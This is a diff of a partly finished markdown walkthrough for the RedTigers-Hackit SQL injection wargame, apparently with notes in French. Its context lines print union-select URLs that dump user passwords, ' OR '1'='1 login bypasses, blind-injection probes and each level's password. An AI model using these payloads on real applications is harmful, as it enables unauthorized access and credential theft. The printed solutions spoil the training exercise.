@@ -2,7 +2,7 @@ RedTigers-Hackit
 ================
 https://redtiger.labs.overthewire.org/
 
-1. Level 1 : Simple SQL-Injection
+##Level 1 : Simple SQL-Injection
 ```
 https://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,username,password%20from%20level1_users
 ```
@@ -10,14 +10,14 @@ https://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,us
 
   The password for the next level is: easylevelsareeasy_! 
    
-2. Level 2 : Simple login-bypass
+##Level 2 : Simple login-bypass
 ```
 username : a' OR '1'='1
 password : a' OR '1'='1
 ```
   The password for the next level is: securitycat_says_meow_and_likes_cheese 
   
-3. Level 3 : Get an error
+##Level 3 : Get an error
 
   Génération de l'erreur :
 ```
@@ -84,7 +84,7 @@ curl --insecure -b level3login=securitycat_says_meow_and_likes_cheese https://re
  Login correct. You are admin :); 
  The password for the next level is: dont_publish_solutions_GRR! 
  
-4. Level 4 : Blind Injection
+##Level 4 : Blind Injection
    Identification de la taille du mot à trouver
 ```nix
 https://redtiger.labs.overthewire.org/level4.php?id=1%20union%20select%20keyword,1%20%20from%20level4_secret%20where%20length%28keyword%29%3C10
@@ -125,7 +125,7 @@ done
  Word correct. 
  The password for the next level is: bananas_are_not_yellow-sometimes
 
-5. Level 5 : Advanced login-bypass
+##Level 5 : Advanced login-bypass
 ```nix
 echo -n toto | md5sum
 f71dbe52628a3f83a77ab494817525c6  -
@@ -137,7 +137,7 @@ passwd : f71dbe52628a3f83a77ab494817525c6
   
   The password for the next level is: my_cat_says_meow_meowmeow 
   
-6. Level 6 : SQL-Injection
+##Level 6 : SQL-Injection
 ```nix
 https://redtiger.labs.overthewire.org/level6.php?user=0%20or%20status=1
 ==> 
@@ -166,12 +166,12 @@ Email: 	m0nsterk1ll
  Login correct. 
  The password for the next level is: dont_shout_at_your_disks*** 
  
-7. Level 7 : SQL-Injection
+##Level 7 : SQL-Injection
   On valide le formulaire de recherche avec dans le champ de saisie la chaine bidon'
   On obtient la requête utilisée :
 ```SQL
 SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%bidon'%' OR text.title LIKE '%bidon'%')
 ```
-8. Level 8 : SQL-Injection
-9. Level 9 : SQL-Injection
-10. Level 10
+##Level 8 : SQL-Injection
+##Level 9 : SQL-Injection
+##Level 10
